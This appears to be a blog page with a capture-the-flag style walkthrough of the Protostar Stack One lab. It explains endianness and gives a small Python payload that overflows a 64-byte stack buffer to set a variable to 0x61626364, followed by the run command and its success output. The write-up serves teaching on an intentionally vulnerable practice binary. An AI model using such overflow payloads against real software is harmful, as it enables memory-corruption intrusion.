<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar - Stack One</strong></h1>
        <a href="https://exploit.education/protostar/stack-one/">https://exploit.education/protostar/stack-one/</a><br>
        <br>
        <img alt="images\15-1.png" src="images/15-1.png"><br>
        <br>
        This level is similar to Stack Zero, except that we have to change the <code>modified</code> variable to a specific value - <code>0x61626364</code>.<br>
        This exercise is teaching you to pay attention to the system architecture you're attacking, and endianness.<br>
        <br>
        <a id="h3-1" name="h3-1"></a><strong></strong>
        <h3><strong>About Endianness</strong></h3><br>
        The endianness of data describes whether the most significant byte (big-endian) or least significant byte (little-endian) is ordered first in the byte sequence.<br>
        <br>
        • The most siginificant byte is the <em>1st</em> byte in a number<br>
        • The least siginificant byte is the <em>last</em> byte in a number<br>
        <br>
        <strong>Example</strong><br>
        • Take the number <code>0x12345678</code><br>
        ◇ 12 is the most significant byte<br>
        ◇ 78 is the least signifiant byte<br>
        <br>
        • Big endian puts the 12 first<br>
        ◇ <code>0x12345678</code> in big endian format = <code>0x12345678</code> (doesn't change)<br>
        • Little endian puts the 78 first (reversing the number)<br>
        ◇ <code>0x12345678</code> in little endian format = <code>0x78563412</code><br>
        <br>
        <strong>Why Endianness Matters</strong><br>
        Depending on the system architecure or protocol you're dealing with, they each read data in different endian formats.<br>
        <br>
        • Network data is big endian<br>
        • x86 CPUs, which is what we're attacking here on Protostar, read in little endian<br>
        <br>
        <strong>Endianness and Protostar</strong><br>
        This means that, because we're attacking an x86 CPU, we need to provide the <code>0x61626364</code> value in little endian format.<br>
        <br>
        We can this manually:<br>
        <code>payload = "\x64\x63\x62\x61"</code><br>
        <br>
        Or we can do it using <code>struct.pack('&lt;I'</code><br>
        <code>payload = struct.pack('&lt;I', 0x61626364)</code><br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Write exploit</strong></h2><br>
        For a more comprehensive explantaion of overwriting the <code>modified</code> variable, you can read my Stack Zero write-up (if you'd like).<br>
        <br>
        First, we write 64 bytes of junk to fill the <code>buffer</code> variable.<br>
        After that, we write <code>0x61626364</code> in little endian format to the stack to overwrite the <code>modified</code> variable.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;One</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">64</span><br>
                payload&nbsp;+=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x61626364</span>)<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Win</strong></h2><br>
        Run stack1 and provide your exploit payload as the argument.<br>
            <div class="codebox">
                $&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>stack1&nbsp;$<span style="color:#ff9d00;font-weight:700">(</span>python&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>stack1.py<span style="color:#ff9d00;font-weight:700">)</span><br>
                you&nbsp;have&nbsp;correctly&nbsp;got&nbsp;the&nbsp;variable&nbsp;to&nbsp;the&nbsp;right&nbsp;value
            </div>
        </div><br>
        <br>
        Success!<br>
        We've changed the <code>modified</code> variable to <code>0x61626364</code> :)<br>
    </writeup>
</section>

</body>
</html>